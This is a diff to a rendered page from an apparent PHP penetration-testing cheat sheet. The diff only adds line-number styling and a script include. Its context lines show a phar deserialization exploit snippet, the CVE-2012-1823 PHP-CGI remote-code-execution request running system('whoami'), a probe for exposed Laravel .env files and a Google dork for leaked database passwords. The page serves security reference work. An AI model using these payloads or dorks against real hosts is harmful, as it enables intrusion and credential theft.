@@ -284,7 +284,7 @@
 file operation such as <code>file_exists</code> might be less protected, then it's possible
 to inject a <code>phar</code> wrapper within it.</p>
 <p>The following code describes how to create a <code>phar</code> wrapper:</p>
-<pre><code class="language-php">&lt;?php
+<pre><code class="language-php line-numbers">&lt;?php
 
 require('weak_class.php');
 # We craft an object by overwriting some methods and functions
@@ -296,7 +296,7 @@ file_put_contents(&quot;/tmp/exploit.phar&quot;, serialize($obj));
 </code></pre>
 
 <p>Here is an example of exploitable functions:</p>
-<pre><code>copy
+<pre><code class="language-none line-numbers">copy
 file_exists
 file_get_contents
 file_put_contents
@@ -331,11 +331,11 @@ unlink
 <h2 id="cve-2012-1823-rce-in-php-cgi">CVE-2012-1823: RCE in PHP-CGI</h2>
 <p>PHP-CGI up to version 5.3.12 and 5.4.2 is vulnerable to an argument injection.</p>
 <p>You can show the page source code:</p>
-<pre><code>GET https://&lt;host&gt;/file.php?-s
+<pre><code class="language-none line-numbers">GET https://&lt;host&gt;/file.php?-s
 </code></pre>
 
 <p>Or even execute PHP scripts (or a remote code execution)</p>
-<pre><code>POST https://&lt;host&gt;/file.php?-d%20allow_url_include%3d1%20-d%20auto_prepend_file%3dphp://input
+<pre><code class="language-none line-numbers">POST https://&lt;host&gt;/file.php?-d%20allow_url_include%3d1%20-d%20auto_prepend_file%3dphp://input
 
 &lt;?php system('whoami'); ?&gt;
 </code></pre>
@@ -344,11 +344,11 @@ unlink
 <h2 id="laravel-configuration-file">Laravel configuration file</h2>
 <p>The Laravel configuration file is sometimes exposed on the Internet with a dotEnv
 file at the root level of the web server:</p>
-<pre><code>https://&lt;host&gt;/.env
+<pre><code class="language-none line-numbers">https://&lt;host&gt;/.env
 </code></pre>
 
 <p>You can find vulnerable target using a Google dork:</p>
-<pre><code>&quot;DB_PASSWORD&quot; filetype:env
+<pre><code class="language-none line-numbers">&quot;DB_PASSWORD&quot; filetype:env
 </code></pre>
             
           </div>
@@ -378,6 +378,7 @@ file at the root level of the web server:</p>
     <script>var base_url = '..';</script>
     <script src="../js/theme.js"></script>
     <script src="../js/prism-core.min.js"></script>
+    <script src="../js/prism-line-numbers.min.js"></script>
     <script src="../js/prism-clike.min.js"></script>
     <script src="../js/prism-yaml.min.js"></script>
     <script src="../js/prism-powershell.min.js"></script>
